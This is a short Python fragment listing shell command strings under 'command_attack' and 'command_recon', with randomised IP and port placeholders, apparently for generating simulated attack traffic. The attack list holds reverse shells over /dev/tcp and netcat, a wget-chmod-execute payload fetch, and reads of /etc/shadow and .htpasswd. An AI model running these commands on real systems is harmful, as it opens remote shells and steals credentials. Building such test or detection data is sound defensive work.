command_attack = [
    "cat /etc/passwd",
    "cat /etc/shadow",
    "nc -u -lvp __rand_int__",
    "sh -i >& /dev/udp/__rand_geo_ip__/82__rand_int__ 0>&1",
    "bash -i >& /dev/tcp/__rand_geo_ip__/86__rand_int__ 0>&1",
    "cd /tmp; wget http://__rand_geo_ip__/ping; chmod +x ping; ./ping",
    "nc -e /bin/sh __rand_geo_ip__ 42__rand_int__",
    "nc -e /bin/bash __rand_geo_ip__ 42__rand_int__",
    "nc -c bash __rand_geo_ip__ 42__rand_int__",
]

command_recon = [
    "ping __rand_geo_ip__ -n 1",
    "whoami",
    "cat /var/log/apache/access_log",
    "cat /var/www/.htpasswd",
    "ls /var/www",
    "hostname",
    "pwd",
    "cd ..",
    "netstat -peanut",
]
